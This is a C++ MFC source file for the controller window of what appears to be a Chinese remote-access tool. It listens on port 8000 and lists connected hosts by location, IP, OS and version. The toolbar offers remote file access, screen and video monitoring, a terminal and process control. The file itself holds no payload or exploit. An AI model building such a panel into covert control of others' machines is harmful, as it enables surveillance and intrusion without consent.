// ClientDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "ClientDlg.h"
#include "ItemData.h"
#include <Mmsystem.h>

#pragma comment(lib,"Winmm.lib")

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CClientDlg dialog

CClientDlg::CClientDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CClientDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CClientDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CClientDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CClientDlg)
	DDX_Control(pDX, IDC_LIST1, m_list);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CClientDlg, CDialog)
	//{{AFX_MSG_MAP(CClientDlg)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_MESSAGE(ID_ONLINE,OnAddHost)
	ON_MESSAGE(ID_OFFLINE,OnOffLine)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CClientDlg message handlers

bool CClientDlg::InitSocket() //初始化SOCKET
{
    WSADATA WSAData;
	WSAStartup(MAKEWORD(2,2), &WSAData);
	SOCKADDR_IN saddr;
	
    s=::socket(AF_INET,SOCK_STREAM,0);
	if(s==SOCKET_ERROR)
	{
		MessageBox(_T("创建连接失败"),_T("提示"),MB_OK|MB_ICONWARNING);
        return false;
	}
	
	saddr.sin_family=AF_INET;
	saddr.sin_addr.S_un.S_addr=INADDR_ANY;
	saddr.sin_port=htons(m_port);
	
	int nRet;
    nRet=::bind(s,(SOCKADDR *)&saddr,sizeof(saddr));
	if(nRet == SOCKET_ERROR)
	{
		MessageBox(_T("绑定端口失败"),_T("提示"),MB_OK|MB_ICONWARNING);
        return false;
	}
	
	nRet=listen(s,m_max);
	if(nRet == SOCKET_ERROR)
	{
		MessageBox(_T("监听端口失败"),_T("提示"),MB_OK|MB_ICONWARNING);
        return false;
	}
	
	while(1)
	{
		SOCKET SerSock;
		SOCKADDR_IN Seraddr;
		int Seraddrsize=sizeof(Seraddr);
		
		SerSock = accept(s,(sockaddr *)&Seraddr,&Seraddrsize);
		if (SerSock == INVALID_SOCKET)
        {
			continue;
        }
        AddHost(SerSock,Seraddr);
	}
    return true;
}

DWORD WINAPI CClientDlg::OninitSocket(LPVOID self) //初始化Socket线程
{
    CClientDlg* t = (CClientDlg*)self;
    t->InitSocket();
    return 0;
}

void CClientDlg::AddHost(SOCKET sock,SOCKADDR_IN addr) //添加主机函数
{
    GetNewItemData(sock,addr);
    return;
}

void CClientDlg::GetNewItemData(SOCKET sock,SOCKADDR_IN addr) //获取新的条目数据
{
    CItemData *item;
    int id;
    int Count = m_list.GetItemCount();
    if(Count == 0)
    {
        id = 0;
    }
    else
    {
        id = 0;
        for(int i=0;i<Count;i++)
        {
            item = (CItemData*)m_list.GetItemData(i);
            if(item->m_id == id)
            {
                i = 0;
                id = id + 1;
                continue;
            }
        }
    }
    item = NULL;
    item = new CItemData(id,sock,&addr,this->m_hWnd);
    item->Run();
}

LRESULT CClientDlg::OnAddHost(WPARAM wparam,LPARAM lparam) //主机上线消息体
{
    CItemData *t = (CItemData*)wparam;
    int i = m_list.GetItemCount();
    m_list.InsertItem(i,t->m_Address,0);
    m_list.SetItemText(i,1,t->m_IP);
    m_list.SetItemText(i,2,t->m_OS);
    m_list.SetItemText(i,3,_T("未开启"));
    m_list.SetItemText(i,4,t->m_Ver);
    m_list.SetItemData(i,(DWORD)t);
    ShowOnLine();
    if(m_Sound == 1)
    {
        PlaySoundW(_T("Sound\\online.wav"),0,SND_FILENAME|SND_ASYNC);
    }
    return 0;
}

LRESULT CClientDlg::OnOffLine(WPARAM wparam,LPARAM lparam) //主机下线消息体
{
    CItemData* t;
    for(int i=0;i<m_list.GetItemCount();i++)
    {
        t = (CItemData*)m_list.GetItemData(i);
        if(t->m_id == (int)wparam)
        {
            ::closesocket(t->GetSocket());
            delete t;
            m_list.DeleteItem(i);
        }
    }
    ShowOnLine();
    if(m_Sound == 1)
    {
        PlaySoundW(_T("Sound\\offline.wav"),0,SND_FILENAME|SND_ASYNC);
    }
    return 0;
}

void  CClientDlg::ShowOnLine() //设置在线主机
{
    int c=m_list.GetItemCount();
    CString online;
    TCHAR* szText;
    online.Format(_T("在线主机：%d 台"),c);
    szText = online.GetBuffer(online.GetLength());
    ::SendMessageW(m_statusbar, SB_SETTEXTW, (WPARAM)1, (LPARAM)szText);
    online.ReleaseBuffer();
}

BOOL CClientDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	m_max=1;
	m_port=8000;
	UpdateMain(8000);
	::CloseHandle(CreateThread(0,0,OninitSocket,(LPVOID)this,0,0)); //运行线程
	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CClientDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CClientDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

void CClientDlg::UpdateMain(int port)
{
    m_imagelist.Create(32,32,ILC_COLOR24|ILC_MASK,1,1);
    CBitmap bmp;
    for(int i=0;i<8;i++)
    {
        bmp.LoadBitmapW(IDB_BITMAP4+i);
        m_imagelist.Add(&bmp,RGB(255,255,255));
        bmp.DeleteObject();
    }
	
	/*
    m_bmp[0].LoadBitmap(IDB_MENU_EXIT);
    m_bmp[1].LoadBitmap(IDB_MENU_SETTING);
    m_bmp[2].LoadBitmap(IDB_MENU_ABOUT);

	
    m_subbmp[0].LoadBitmapW(IDB_MENU_AGENT);
    m_subbmp[1].LoadBitmapW(IDB_MENU_SHUTDOWN);
    m_subbmp[2].LoadBitmapW(IDB_MENU_RESTART);
    m_subbmp[3].LoadBitmapW(IDB_MENU_UPDATE);
    m_subbmp[4].LoadBitmapW(IDB_MENU_HTTP);
    m_subbmp[5].LoadBitmapW(IDB_MENU_RUN);
	
	/*
    GetMenu()->GetSubMenu(0)->SetMenuItemBitmaps(0,MF_BYPOSITION, &m_bmp[0], &m_bmp[0]);
    GetMenu()->GetSubMenu(1)->SetMenuItemBitmaps(0,MF_BYPOSITION, &m_bmp[1], &m_bmp[1]);
    GetMenu()->GetSubMenu(2)->SetMenuItemBitmaps(0,MF_BYPOSITION, &m_bmp[2], &m_bmp[2]);
	*/

    const UINT t[9] = {1001,1002,1003,1004,1005,1006,0,1007,1008};
    m_toolbar.CreateEx(this);
    m_toolbar.SetButtons(t,9);
    m_toolbar.SetSizes(CSize(60,56),CSize(24,24));
    m_toolbar.SetButtonText(0,_T("文件管理"));
    m_toolbar.SetButtonText(1,_T("屏幕监控"));
    m_toolbar.SetButtonText(2,_T("超级终端"));
    m_toolbar.SetButtonText(3,_T("进程管理"));
    m_toolbar.SetButtonText(4,_T("视频监控"));
    m_toolbar.SetButtonText(5,_T("卸载主机"));
    m_toolbar.SetButtonText(7,_T("程序设置"));
    m_toolbar.SetButtonText(8,_T("关于软件"));
    m_toolbar.GetToolBarCtrl().SetImageList(&m_imagelist);
	
    BOOL hbar = m_statusbar.Create(this);
    UINT b[2]={1009,1010};
    hbar = m_statusbar.SetIndicators(b,2);
    m_statusbar.SetPaneInfo(0,b[0],SBPS_NORMAL,400);
    m_statusbar.SetPaneInfo(1,b[1],SBPS_NORMAL,180);
    CString ListemPort;
    ListemPort.Format(_T("监听端口：%d"),port);
    m_statusbar.SetPaneText(0,ListemPort);
    m_statusbar.SetPaneText(1,_T("在线主机：0 台"));
    RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);
	
	/*
    m_mainicon.Create(16,16,ILC_COLOR24|ILC_MASK,1,0);
    m_mainicon.Add(LoadIcon(AfxGetResourceHandle(),MAKEINTRESOURCE(IDI_USER)));
    m_mainicon.Add(LoadIcon(AfxGetResourceHandle(),MAKEINTRESOURCE(IDI_CAM)));
    m_list.SetImageList(&m_mainicon,LVSIL_SMALL);
	*/

    m_list.SetExtendedStyle(LVS_EX_FULLROWSELECT|LVS_EX_GRIDLINES|LVS_EX_CHECKBOXES);
    m_list.InsertColumn(0,_T("地理位置"),LVCFMT_LEFT,160);
    m_list.InsertColumn(1,_T("IP地址"),LVCFMT_LEFT,110);
    m_list.InsertColumn(2,_T("操作系统"),LVCFMT_LEFT,90);
    m_list.InsertColumn(3,_T("代理状态"),LVCFMT_LEFT,90);
    m_list.InsertColumn(4,_T("服务端版本号"),LVCFMT_LEFT,150);
	
    //GetClientRect(&m_rect);
}

BOOL CClientDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	if(pMsg->message==WM_KEYDOWN)
    {
        int nVirtKey = (int)pMsg->wParam;
        if(nVirtKey==VK_RETURN || nVirtKey==VK_ESCAPE)
        {
            return TRUE;
        }
    }
	return CDialog::PreTranslateMessage(pMsg);
}

void CClientDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here

    if(nType == SIZE_MINIMIZED)
    {
        return;
    }
    // TODO: 在此处添加消息处理程序代码
    CWnd *pWnd;
    pWnd = GetDlgItem(IDC_LIST1);     //获取控件句柄
    if(pWnd)//判断是否为空，因为对话框创建时会调用此函数，而当时控件还未创建
    {
        CRect rect,rect_l;   //获取控件变化前大小
        GetClientRect(&rect_l);
        pWnd->GetWindowRect(&rect);
        ScreenToClient(&rect);
        rect.right = cx;
        rect.bottom= rect.bottom + (rect_l.bottom - m_rect.bottom);
        pWnd->MoveWindow(rect);//设置控件大小
        RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);
    }
    /*
    else
    {
        delete pWnd;
    }
    */
    GetClientRect(&m_rect);
}
